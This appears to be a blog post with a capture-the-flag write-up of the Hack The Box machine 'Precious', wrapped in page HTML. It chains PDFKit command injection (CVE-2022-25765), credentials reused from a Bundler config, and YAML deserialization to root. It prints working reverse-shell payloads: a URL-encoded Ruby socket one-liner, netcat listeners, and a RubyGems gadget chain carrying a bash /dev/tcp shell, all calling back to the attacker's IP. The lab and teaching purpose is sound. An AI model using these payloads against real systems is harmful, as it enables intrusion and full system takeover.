@@ -1,0 +1,386 @@
+<!doctype html>
+<html lang="en">
+<head>
+  
+  
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Slop Overflow</title>
+<meta name="description" content="Cybersecurity, AI, OSINT, geopolitics, and lessons learned by breaking things." />
+<meta name="theme-color" content="#07090c" />
+<meta property="og:title" content="Slop Overflow" />
+<meta property="og:description" content="Cybersecurity, AI, OSINT, geopolitics, and lessons learned by breaking things." />
+<meta property="og:type" content="article" />
+<meta name="twitter:card" content="summary" />
+<link rel="icon" href="/favicon.ico" />
+<link rel="alternate" type="application/rss+xml" title="Slop Overflow RSS" href="/rss.xml" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;600;700&family=Outfit:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="/_assets/css/style.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
+<script defer src="/_assets/js/app.js"></script>
+<script data-goatcounter="https://giuslock.goatcounter.com/count" async src="//gc.zgo.at/count.js"></script>
+
+<link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+<body>
+<div class="layout">
+  
+
+
+
+<a class="skip-link" href="#main-content">Skip to content</a>
+
+<!-- Mobile topbar -->
+<header class="topbar">
+  <button class="hamburger" id="nav-toggle" aria-label="Open menu" aria-controls="sidebar" aria-expanded="false">&#9776;</button>
+  <a href="/" class="topbar-brand">Slop Overflow</a>
+  <a href="/search" class="topbar-search" aria-label="Search posts">grep</a>
+</header>
+
+<!-- Overlay -->
+<div class="overlay" id="nav-overlay"></div>
+
+<!-- Sidebar -->
+<aside class="sidebar" id="sidebar" aria-label="Site navigation" tabindex="-1">
+  <div class="sidebar-body">
+
+    <a href="/" class="brand">
+      <img src="/_assets/img/profile.png" alt="Portrait of Giuslock" class="brand-avatar" width="44" height="44" loading="lazy" />
+      <span>
+        <span class="brand-name">Slop Overflow</span>
+        <span class="brand-sub">Security field notes, writeups, and useful skepticism.</span>
+      </span>
+    </a>
+
+    <nav>
+      <ul class="nav-list">
+        <li><a href="/"><span class="nav-icon">~/</span> Home</a></li>
+        <li><a href="/archives"><span class="nav-icon">ls</span> Archives</a></li>
+        <li><a href="/tags"><span class="nav-icon">#</span> Tags</a></li>
+        <li><a href="/about"><span class="nav-icon">id</span> About</a></li>
+        
+          <li><a href="/rss.xml"><span class="nav-icon">rss</span> RSS</a></li>
+        
+      </ul>
+    </nav>
+
+    <div class="sidebar-search">
+      <form action="/search" method="get">
+        <input type="search" name="q" placeholder="Search posts&#8230;" aria-label="Search" />
+        <button type="submit">Go</button>
+      </form>
+    </div>
+
+  </div>
+
+  <footer class="sidebar-foot">
+    &copy; 2026 Giuslock
+  </footer>
+</aside>
+
+  <main class="main" id="main-content" tabindex="-1">
+    <div class="page">
+
+      
+
+      <!-- Breadcrumb -->
+      <nav class="breadcrumb" aria-label="Breadcrumb">
+        <a href="/">~</a>
+        <span class="breadcrumb-sep">/</span>
+        <a href="/archives">archives</a>
+        
+          <span class="breadcrumb-sep">/</span>
+          <a href="/tags#topic%3Actf">topic:ctf</a>
+        
+      </nav>
+
+      <!-- Title & meta -->
+      <h1>Precious - An HTB easy machine</h1>
+      <div class="meta-row">
+        <span class="badge">
+          <span class="badge-dot"></span>
+          <time datetime="2026-09-20T19:36:01.907Z">2026-09-20</time>
+        </span>
+        <span class="badge"><span class="badge-dot"></span>4 min read</span>
+        
+          <span class="badge"><span class="badge-dot"></span>Giuslock</span>
+        
+        
+          <span class="badge"><span class="badge-dot"></span>topic:ctf, htb</span>
+        
+      </div>
+
+      <!-- Content -->
+      <div class="prose"><h1 id="precious-an-htb-easy-machine">Precious - An HTB easy machine</h1>
+<p><a title="https://app.hackthebox.com/machines/Precious" href="https://app.hackthebox.com/machines/Precious">Link to target</a></p>
+<p><strong>Hostname:</strong> precious.htb<br />
+<strong>Difficulty:</strong> Easy<br />
+<strong>OS:</strong> Linux (Debian)</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Platform</strong></td>
+<td>Hack The Box</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>Easy</td>
+</tr>
+<tr>
+<td><strong>OS</strong></td>
+<td>Linux (Debian)</td>
+</tr>
+<tr>
+<td><strong>Domain</strong></td>
+<td>precious.htb</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="table-of-contents">Table of Contents</h2>
+<ul>
+<li><a title="#summary" href="#summary">Summary</a></li>
+<li><a title="#reconnaissance" href="#reconnaissance">Reconnaissance</a></li>
+<li><a title="#foothold--pdfkit-command-injection" href="#foothold--pdfkit-command-injection">Foothold — PDFKit command injection</a></li>
+<li><a title="#lateral-movement--ruby-to-henry" href="#lateral-movement--ruby-to-henry">Lateral Movement — ruby to henry</a></li>
+<li><a title="#privilege-escalation--unsafe-yaml-deserialization" href="#privilege-escalation--unsafe-yaml-deserialization">Privilege Escalation — unsafe YAML deserialization</a></li>
+<li><a title="#flags" href="#flags">Flags</a></li>
+<li><a title="#vulnerability-summary" href="#vulnerability-summary">Vulnerability Summary</a></li>
+<li><a title="#attack-chain" href="#attack-chain">Attack Chain</a></li>
+<li><a title="#lessons-learned" href="#lessons-learned">Lessons Learned</a></li>
+</ul>
+<hr />
+<h2 id="summary">Summary</h2>
+<p>Precious exposes an application that converts a user-supplied web page into a<br />
+PDF. The generated file's metadata reveals <strong>PDFKit 0.8.6</strong>, which is vulnerable<br />
+to command injection (<strong>CVE-2022-25765</strong>) and can be exploited to obtain a shell<br />
+as <code>ruby</code>. This account's Bundler configuration discloses the credentials for<br />
+<code>henry</code>. Finally, <code>henry</code> can run as root a script that deserializes a<br />
+user-controlled file with <code>YAML.load</code>; a RubyGems gadget chain leads to root.</p>
+<hr />
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<div><pre class="hljs"><code>nmap -vvv -p 22,80 -sVC -oN precious.txt 10.129.59.63</code></pre></div>
+<div><pre class="hljs"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Did not follow redirect to http://precious.htb/</code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-built_in">echo</span> <span class="hljs-string">'10.129.59.63 precious.htb'</span> | sudo tee -a /etc/hosts</code></pre></div>
+<h3 id="web-application">Web application</h3>
+<p>The site fetches a URL and returns a PDF of the page. To test it, an HTML file<br />
+can be hosted on the attacking machine:</p>
+<div><pre class="hljs"><code>python3 -m http.server 8000
+<span class="hljs-comment"># enter in the application: http://10.10.15.133:8000/test.html</span></code></pre></div>
+<p>The metadata identifies the vulnerable component:</p>
+<div><pre class="hljs"><code>exiftool x8fswl4vu0mvvblxp5nets07u9xga77s.pdf</code></pre></div>
+<div><pre class="hljs"><code>Creator : Generated by PDFKit v0.8.6</code></pre></div>
+<h3 id="key-findings">Key Findings</h3>
+<ul>
+<li><strong>22/tcp</strong> — OpenSSH 8.4p1 on Debian, useful after recovering credentials.</li>
+<li><strong>80/tcp</strong> — nginx serves an HTML-to-PDF converter based on PDFKit 0.8.6.</li>
+</ul>
+<hr />
+<h2 id="foothold-pdfkit-command-injection">Foothold — PDFKit command injection</h2>
+<p>PDFKit 0.8.6 passes the URL to <code>wkhtmltopdf</code> without properly neutralizing<br />
+certain characters. <strong>CVE-2022-25765</strong> makes it possible to inject a<br />
+backtick-delimited command into the URL and have the conversion process execute<br />
+it.</p>
+<h3 id="exploitation">Exploitation</h3>
+<div><pre class="hljs"><code>rlwrap nc -lvnp 4444</code></pre></div>
+<div><pre class="hljs"><code>curl <span class="hljs-string">'http://precious.htb/'</span> \
+  -X POST \
+  -H <span class="hljs-string">'Content-Type: application/x-www-form-urlencoded'</span> \
+  --data-raw <span class="hljs-string">'url=http%3A%2F%2F10.10.15.133%3A4444%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.15.133%22%2C4444%29%29%27%60'</span></code></pre></div>
+<p>The decoded payload is:</p>
+<div><pre class="hljs"><code>http://10.10.15.133:4444/?name=%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=&gt;TCPSocket.new("10.10.15.133",4444))'`</code></pre></div>
+<p>Double-encoding <code>%20</code> as <code>%2520</code> preserves the required space before the<br />
+backtick after the form is decoded once. Reference PoC:<br />
+<a title="https://github.com/shamo0/PDFkit-CMD-Injection" href="https://github.com/shamo0/PDFkit-CMD-Injection">shamo0/PDFkit-CMD-Injection</a>.</p>
+<p>Result: <strong>a shell as <code>ruby</code></strong>.</p>
+<div><pre class="hljs"><code>ruby@precious:/var/www/pdfapp$ whoami
+ruby</code></pre></div>
+<hr />
+<h2 id="lateral-movement-ruby-to-henry">Lateral Movement — ruby to henry</h2>
+<p><code>/home</code> contains the <code>ruby</code> and <code>henry</code> accounts. LinPEAS highlights an<br />
+unusual Bundler configuration file:</p>
+<div><pre class="hljs"><code>cat /home/ruby/.bundle/config</code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-meta">---</span>
+<span class="hljs-attr">BUNDLE_HTTPS://RUBYGEMS__ORG/:</span> <span class="hljs-string">"henry:[REDACTED]"</span></code></pre></div>
+<p>The password is reused by the local <code>henry</code> account:</p>
+<div><pre class="hljs"><code>su - henry
+<span class="hljs-comment"># password: [REDACTED]</span></code></pre></div>
+<p>Result: <strong>a shell as <code>henry</code></strong>.</p>
+<div><pre class="hljs"><code>cat /home/henry/user.txt
+<span class="hljs-comment"># [REDACTED]</span></code></pre></div>
+<hr />
+<h2 id="privilege-escalation-unsafe-yaml-deserialization">Privilege Escalation — unsafe YAML deserialization</h2>
+<h3 id="enumeration">Enumeration</h3>
+<div><pre class="hljs"><code>sudo -l</code></pre></div>
+<div><pre class="hljs"><code>User henry may run the following commands on precious:
+    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb</code></pre></div>
+<p>The privileged script reads <code>dependencies.yml</code> from the <strong>current working<br />
+directory</strong> and passes it directly to <code>YAML.load</code>:</p>
+<div><pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">list_from_file</span></span>
+  YAML.load(File.read(<span class="hljs-string">"dependencies.yml"</span>))
+<span class="hljs-keyword">end</span></code></pre></div>
+<p>The legitimate <code>/opt/sample/dependencies.yml</code> file contains:</p>
+<div><pre class="hljs"><code><span class="hljs-attr">yaml:</span> <span class="hljs-number">0.1</span><span class="hljs-number">.1</span>
+<span class="hljs-attr">pdfkit:</span> <span class="hljs-number">0.8</span><span class="hljs-number">.6</span></code></pre></div>
+<p>However, the relative path and unsafe deserialization allow <code>henry</code> to make<br />
+root load an arbitrary object chain.</p>
+<h3 id="exploitation-2">Exploitation</h3>
+<p>On the attacking machine:</p>
+<div><pre class="hljs"><code>rlwrap nc -lvnp 5555</code></pre></div>
+<p>In a directory controlled by <code>henry</code>, create <code>dependencies.yml</code>:</p>
+<div><pre class="hljs"><code><span class="hljs-meta">---</span>
+<span class="hljs-bullet">-</span> <span class="hljs-type">!ruby/object:Gem::Installer</span>
+    <span class="hljs-attr">i:</span> <span class="hljs-string">x</span>
+<span class="hljs-bullet">-</span> <span class="hljs-type">!ruby/object:Gem::SpecFetcher</span>
+    <span class="hljs-attr">i:</span> <span class="hljs-string">y</span>
+<span class="hljs-bullet">-</span> <span class="hljs-type">!ruby/object:Gem::Requirement</span>
+  <span class="hljs-attr">requirements:</span>
+    <span class="hljs-type">!ruby/object:Gem::Package::TarReader</span>
+    <span class="hljs-attr">io:</span> <span class="hljs-string">&amp;1</span> <span class="hljs-type">!ruby/object:Net::BufferedIO</span>
+      <span class="hljs-attr">io:</span> <span class="hljs-string">&amp;1</span> <span class="hljs-type">!ruby/object:Gem::Package::TarReader::Entry</span>
+         <span class="hljs-attr">read:</span> <span class="hljs-number">0</span>
+         <span class="hljs-attr">header:</span> <span class="hljs-string">"abc"</span>
+      <span class="hljs-attr">debug_output:</span> <span class="hljs-string">&amp;1</span> <span class="hljs-type">!ruby/object:Net::WriteAdapter</span>
+         <span class="hljs-attr">socket:</span> <span class="hljs-string">&amp;1</span> <span class="hljs-type">!ruby/object:Gem::RequestSet</span>
+             <span class="hljs-attr">sets:</span> <span class="hljs-type">!ruby/object:Net::WriteAdapter</span>
+                 <span class="hljs-attr">socket:</span> <span class="hljs-type">!ruby/module</span> <span class="hljs-string">'Kernel'</span>
+                 <span class="hljs-attr">method_id:</span> <span class="hljs-string">:system</span>
+             <span class="hljs-attr">git_set:</span> <span class="hljs-string">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.15.133/5555 0&gt;&amp;1'"</span>
+         <span class="hljs-attr">method_id:</span> <span class="hljs-string">:resolve</span></code></pre></div>
+<p>Run the script from the directory containing the payload:</p>
+<div><pre class="hljs"><code>mkdir -p /tmp/precious
+<span class="hljs-built_in">cd</span> /tmp/precious
+<span class="hljs-comment"># save dependencies.yml here</span>
+sudo /usr/bin/ruby /opt/update_dependencies.rb</code></pre></div>
+<p>During <code>YAML.load</code>, object reconstruction reaches <code>Kernel.system</code> and<br />
+executes the reverse shell stored in <code>git_set</code>.</p>
+<div><pre class="hljs"><code>whoami
+root</code></pre></div>
+<h3 id="root-flag">Root Flag</h3>
+<div><pre class="hljs"><code>cat /root/root.txt
+<span class="hljs-comment"># [REDACTED]</span></code></pre></div>
+<hr />
+<h2 id="flags">Flags</h2>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Location</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>user.txt</code></td>
+<td><code>/home/henry/user.txt</code> — <code>[REDACTED]</code></td>
+</tr>
+<tr>
+<td><code>root.txt</code></td>
+<td><code>/root/root.txt</code> — <code>[REDACTED]</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="vulnerability-summary">Vulnerability Summary</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Vulnerability</th>
+<th>CVE</th>
+<th>Impact</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>PDFKit 0.8.6 command injection</td>
+<td>CVE-2022-25765</td>
+<td>Unauthenticated RCE as <code>ruby</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>Cleartext credentials in the Bundler configuration</td>
+<td>—</td>
+<td>Access to <code>henry</code> through password reuse</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>sudo</code> access to a script using <code>YAML.load</code> and a relative path</td>
+<td>—</td>
+<td>Code execution as root</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="attack-chain">Attack Chain</h2>
+<div><pre class="hljs"><code>                         UNAUTHENTICATED
+                               |
+                    HTTP :80 — HTML-to-PDF app
+                    PDF metadata: PDFKit 0.8.6
+                               |
+                 CVE-2022-25765 command injection
+                               |
+                         RCE as ruby
+                               |
+             /home/ruby/.bundle/config credentials
+                 henry:[REDACTED]
+                               |
+                  password reuse -&gt; su henry
+                    USER FLAG: [REDACTED]
+                               |
+        sudo ruby /opt/update_dependencies.rb (NOPASSWD)
+          relative dependencies.yml + unsafe YAML.load
+                               |
+              RubyGems gadget chain -&gt; Kernel.system
+                               |
+                         ROOT as root
+                    ROOT FLAG: [REDACTED]</code></pre></div>
+<hr />
+<h2 id="lessons-learned">Lessons Learned</h2>
+<ul>
+<li><strong>Metadata is part of enumeration</strong> — the PDF's <code>Creator</code> field reveals the<br />
+exact version of the vulnerable component.</li>
+<li><strong>Package-manager configuration files may contain secrets</strong> — <code>.bundle/config</code><br />
+should have minimal permissions, and its passwords must not be reused.</li>
+<li><strong>Do not use <code>YAML.load</code> on attacker-controlled input</strong> — use<br />
+<code>YAML.safe_load</code> with a minimal allowlist to prevent arbitrary object<br />
+construction.</li>
+<li><strong>A sudo rule is only as safe as all of its inputs</strong> — a root script should<br />
+read root-owned files from absolute paths and validate their contents.</li>
+</ul>
+</div>
+
+      <!-- Prev / Next -->
+      <nav class="post-nav" aria-label="Post navigation">
+        <div class="post-nav-prev">
+          
+        </div>
+        <div class="post-nav-next">
+          
+            <a href="/article/the-great-digital-anesthesia">The Great Digital Anesthesia &rarr;</a>
+          
+        </div>
+      </nav>
+
+    </div>
+    <footer class="site-footer">
+  &copy; 2026 Giuslock &mdash; Security field notes, writeups, and useful skepticism.
+</footer>
+<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+
+  </main>
+</div>
+</body>
+</html>
